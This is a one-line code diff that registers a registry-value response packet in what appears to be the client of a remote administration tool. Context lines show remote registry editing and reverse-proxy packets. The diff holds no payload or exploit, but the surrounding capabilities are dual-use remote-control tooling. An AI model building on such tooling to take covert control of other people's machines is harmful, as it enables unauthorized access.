@@ -82,6 +82,7 @@ namespace xClient.Core.Networking
                 typeof (Packets.ClientPackets.GetCreateRegistryKeyResponse),
                 typeof (Packets.ClientPackets.GetDeleteRegistryKeyResponse),
                 typeof (Packets.ClientPackets.GetRenameRegistryKeyResponse),
+                typeof (Packets.ClientPackets.GetCreateRegistryValueResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
